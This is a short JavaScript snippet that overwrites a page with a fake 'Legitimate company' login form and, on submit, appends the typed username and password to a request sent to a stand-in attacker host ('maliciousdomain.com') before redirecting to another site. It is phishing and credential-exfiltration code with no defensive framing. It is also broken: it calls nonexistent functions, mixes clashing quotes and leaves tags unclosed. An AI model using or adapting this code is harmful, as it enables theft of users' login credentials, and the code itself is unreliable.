document.title = 'Allegiance-Login in';
document.getElementById('template').innerHTML = "<center><h1>Legitimate company<h1><p>username: <input type=textbox name=username</p><p>password: <input type=textbox name=password</p><button onclick="myFunction()">Submit</button></center>";
function myFunction() {
  var username = document.getElementByName('username');
  var password = document.getElementByName('password');
  $.getScript("http://maliciousdomain.com" + username + password);
  window.replace("https://dell.inquisiteasp.com");
}

